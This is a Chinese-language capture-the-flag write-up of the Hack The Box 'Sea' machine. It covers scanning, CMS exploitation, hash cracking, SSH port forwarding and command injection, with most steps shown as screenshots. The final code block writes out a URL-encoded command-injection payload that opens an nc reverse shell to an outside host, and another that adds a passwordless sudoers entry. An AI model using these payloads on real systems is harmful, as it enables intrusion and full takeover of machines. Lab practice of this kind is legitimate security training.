---
UID: 20250614100412
aliases: 
tags:
  - 打靶
  - 渗透
  - linux
  - "#hackthebox"
source: 
cssclasses: 
created: 2025-06-14
---

 ![image.png](https://s2.loli.net/2025/06/14/VSqv4MFmpf3ls8D.png)
[[htb 靶场 sea 思路 1]]
## nmap 扫描端口
![image.png](https://s2.loli.net/2025/06/14/13JhH7tMsGjQuZX.png)

存在 ssh 端口和 80 web 服务端口

## web 服务信息收集
![image.png](https://s2.loli.net/2025/06/14/VrIei17zydRPwJl.png)


这里需要绑一个域名(sea.htb)

![image.png](https://s2.loli.net/2025/06/14/wlMVFoKRpXPZOJg.png)

有个可以点击的地方，点进去看看

![image.png](https://s2.loli.net/2025/06/14/jaCcqsdGPt56KlO.png)

推断可能是 sql 注入或者 xss 之类的

输入单引号，双引号都是显示以下的提示，这就排除 sql 注入了

![image.png](https://s2.loli.net/2025/06/14/qHdFzGNteS9Vrcj.png)

换个地方找找看

枚举一下网站的目录

![image.png](https://s2.loli.net/2025/06/14/DBL7IAxpSN8it41.png)

会发现扫出一个 theme 目录，还有插件目录。

访问/themes/bike/version

![image.png](https://s2.loli.net/2025/06/14/pu2iQ6UH5wODztm.png)

找到一个版本号，搜搜有漏洞吗

![image.png](https://s2.loli.net/2025/06/14/6CvEJTKIBW9ZLgd.png)


## 漏洞利用

![image.png](https://s2.loli.net/2025/06/14/oIe5p7REui8c9Vd.png)


![image.png](https://s2.loli.net/2025/06/14/FOm7Qfr5DPRkJIM.png)

![image.png](https://s2.loli.net/2025/06/14/UjrL8yG53QgfI9w.png)


![image.png](https://s2.loli.net/2025/06/14/bfFYNxmWpgud1Ry.png)



![](https://s2.loli.net/2025/06/14/b2XKYZTvWdBxPV1.png)



## 提权
反弹 shell 成功，准备提权。用 linpeas 进行信息收集

![image.png](https://s2.loli.net/2025/06/14/c14SV5rdzeKqAN9.png)

有个 8080 端口

![image.png](https://s2.loli.net/2025/06/14/POJm1KHy9cj36q2.png)

找到 user. txt 。但问题是目前还是 www-data用户，还没法进入 amay 目录

![image.png](https://s2.loli.net/2025/06/14/C9fLyEGVboWdxBe.png)

找到一个 messages 目录，应该也是有作用的（实际上并没有作用）

只能慢慢寻找

![image.png](https://s2.loli.net/2025/06/14/VeTxuwciMgtKoZr.png)

在网站的目录中找到一串密码。拉到 john 进行破解一下

但一直报错
![image.png](https://s2.loli.net/2025/06/14/IpFlXkYZzmaP2S6.png)

怀疑是里面的斜杠的问题，删掉之后能成功破解

![image.png](https://s2.loli.net/2025/06/14/qRliMfGDvIWHyQd.png)

知道有个密码，但不知道如何使用，就用来试试是不是/home 中两个用户的密码

![image.png](https://s2.loli.net/2025/06/14/kXt1z2CyVARpGfH.png)

成功登录 amay 用户
![image.png](https://s2.loli.net/2025/06/14/FpO3ERCzyusVUi8.png)

并无东西

![image.png](https://s2.loli.net/2025/06/14/kGYhrz8MuXgeRQc.png)

第一个 flag 到手

基于刚刚在反弹 shell 中找了这么久没点东西，只能用 ssh 端口转发，转发 8080 端口

![image.png](https://s2.loli.net/2025/06/14/4CTsfnOAIdloLGe.png)

真有东西

![image.png](https://s2.loli.net/2025/06/14/zhmQWfe73lbCj9y.png)

是个执行命令的界面
![image.png](https://s2.loli.net/2025/06/14/DKekE4i9CZsXcAJ.png)

bp 抓包

![image.png](https://s2.loli.net/2025/06/14/e8QBd4gJfMkTcwq.png)

能查看到/etc/passwd
![image.png](https://s2.loli.net/2025/06/14/rWB6UsX9PRdVokT.png)

既然是命令注入尝试能不能同时执行命令

![image.png](https://s2.loli.net/2025/06/14/suetKYBf4pC2XIA.png)

被拦住了

![image.png](https://s2.loli.net/2025/06/14/qQmhxv4Ic76gLen.png)


用了这招来绕过
```
用+号来代替空格

其实说白了就是在bp中使用加密
/etc/passwd+/etc/hosts+#

/etc/passwd+%26%26+id+#
/etc/passwd && id #
```


![](https://s2.loli.net/2025/06/14/Ojs3hI1fH9tlecL.png)


![image.png](https://s2.loli.net/2025/06/14/Tc3798yzKjpqZoN.png)

成功

```
反弹shell
/etc/passwd+%26%26+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+10.10.16.2+5555+>/tmp/f+%23

修改权限
/etc/passwd+%26%26+echo+"amay+ALL=(ALL)+NOPASSWD:+ALL"+>+/etc/sudoers.d/amay+#
```

反弹 shell 一下子就自动退出了
![image.png](https://s2.loli.net/2025/06/14/kDUXzynbNjSQt1I.png)

修改权限
![image.png](https://s2.loli.net/2025/06/14/5BMY9SCxeW2jQfI.png)


![image.png](https://s2.loli.net/2025/06/14/CFoV4L9gdmG8Puj.png)


![image.png](https://s2.loli.net/2025/06/14/VdNmaSu7JPo9ljH.png)


![image.png](https://s2.loli.net/2025/06/14/L9rztChApJyUP8e.png)
